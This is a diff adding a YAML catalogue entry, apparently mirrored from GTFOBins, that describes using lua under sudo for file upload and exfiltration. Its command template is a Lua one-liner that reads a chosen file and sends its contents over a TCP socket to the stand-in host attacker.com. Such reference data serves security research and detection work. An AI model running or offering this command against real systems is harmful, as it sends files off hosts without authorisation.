@@ -1,0 +1,27 @@
+id: gtfobins/lua/upload/sudo
+type: binary
+platform: linux
+name: lua
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: "lua -e '\n  local f=io.open(\"/path/to/input-file\", \"rb\")\n  local d=f:read(\"*a\")\n\
+    \  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"attacker.com\"\
+    ,12345);\n  t:send(d);\n  t:close();'"
+  comment: This requires `lua-socket` to be available.
+references:
+- https://gtfobins.github.io/gtfobins/lua/
+tags:
+- linux
+- unix
+- gtfobins
